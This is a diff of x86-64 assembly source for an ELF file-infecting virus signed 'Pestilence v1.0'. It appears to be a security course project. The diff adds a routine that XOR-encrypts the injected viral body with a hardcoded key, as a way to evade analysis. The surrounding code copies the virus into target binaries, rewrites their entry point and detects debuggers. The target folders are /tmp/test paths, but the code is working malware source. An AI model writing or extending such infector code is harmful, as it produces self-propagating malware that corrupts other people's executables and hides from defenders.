@@ -22,10 +22,7 @@ begin:
 	cmp rax, 0					; 	goto .skipped;
 	je .skipped					; ...
 
-	lea rdi, [rel infected_folder_1]		; treate_folder(infected_folder_1);
-	call treate_folder				; ...
-	lea rdi, [rel infected_folder_2]		; treate_folder(infected_folder_2);
-	call treate_folder				; ...
+	call infection_routine				; infection_routine();
 
 .skipped:
 	; restore all registers
@@ -66,6 +63,14 @@ can_run_infection:
 		call print_string			; ...
 		xor rax, rax				; return 0;
 		ret
+
+; void infection_routine()
+infection_routine:
+	lea rdi, [rel infected_folder_1]		; treate_folder(infected_folder_1);
+	call treate_folder				; ...
+	lea rdi, [rel infected_folder_2]		; treate_folder(infected_folder_2);
+	call treate_folder				; ...
+	ret
 
 ; void treate_folder(char const *_folder);
 ; void treate_folder(rdi folder);
@@ -327,7 +332,7 @@ treat_file:
 	lea rsi, [rel begin]				; src = begin; //TODO Fuck lldb
 	mov rcx, _end - begin				; len = _end - begin;
 	rep movsb					; memcpy(dest, src, len);
-
+	
 	; compute jmp_value
 	mov rdi, [mappedfile]				; _jmp_value = file_map
 	add rdi, elf64_hdr.e_entry			; 	->e_entry;
@@ -348,6 +353,14 @@ treat_file:
 	add rdi, elf64_hdr.e_entry			; ...
 	mov rax, [new_vaddr]				; *_e_entry = new_vaddr;
 	mov [rdi], rax					; ...
+
+	; xor cipher all injected bytes between infection_routine and _end
+	mov rdi, [mappedfile]				; data = file_map + filesize + (infection_routine - _begin);
+	add rdi, [filesize]				;
+	add rdi, infection_routine - begin		;
+	mov rsi, _end - infection_routine		; size = _end - infection_routine
+	lea rdx, [key]					; key = key
+	call xor_cipher					; xor_cipher(data, size, key)
 
 .unmap_file:
 	mov rax, SYS_MUNMAP				; _ret = munmap(
@@ -710,13 +723,42 @@ print_string:
 
 	ret
 
+; void xor_cipher(char *data, int size, char *key);
+; xor_cipher(rdi data, rsi size, rdx key);
+xor_cipher:
+	push rdx					; save key
+
+    xor_loop:
+        cmp rsi, 0					; if (size == 0)
+        je xor_end					; 	goto xor_end
+
+        mov al, [rdi]					; al = *data
+        mov bl, [rdx]					; bl = *key
+        xor al, bl					; al ^= bl
+        mov [rdi], al					; *data = al
+
+        inc rdi						; data++
+        inc rdx						; key++
+        dec rsi						; size--
+
+        cmp byte [rdx], 0				; if (*key != 0)
+        jne xor_loop					; 	goto xor_loop
+
+	mov rdx, [rsp] 					; restore key
+        jmp xor_loop					; goto xor_loop
+
+    xor_end:
+	pop rdx						; restore key
+        ret						; return
+
 section .data
 	infected_folder_1: db "/tmp/test/", 0
 	infected_folder_2: db "/tmp/test2/", 0
 	elf_64_magic: db 0x7F, "ELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0
 	len_elf_64_magic: equ $ - elf_64_magic
+	key db "S3cr3tK3y", 0
+	debugged_message: db "DEBUG DETECTED, dommage ;) !", 0
 	; never used but here to be copied in the binary
 	signature: db "Pestilence v1.0 by jmaia and dhubleur"
-	debugged_message: db "DEBUG DETECTED, dommage ;) !", 0
 
 _end:
